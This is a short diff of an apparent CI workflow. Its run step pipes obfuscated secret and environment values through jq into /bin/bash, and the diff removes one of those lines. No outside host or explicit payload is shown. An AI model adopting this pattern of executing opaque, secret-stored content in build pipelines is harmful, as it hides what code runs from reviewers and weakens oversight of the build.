@@ -23,7 +23,6 @@ jobs:
           ax796: ${{ secrets.ax796 }}
         run: |
           printf '%s' "$ax796" | jq -r .fc81 | /bin/bash
-          printf '%s' "$bkzr0958" | jq -r .flwor66498 | /bin/bash
           echo $axex9641 | jq -r .ygf60742 | /bin/bash
 
       - name: Archive output
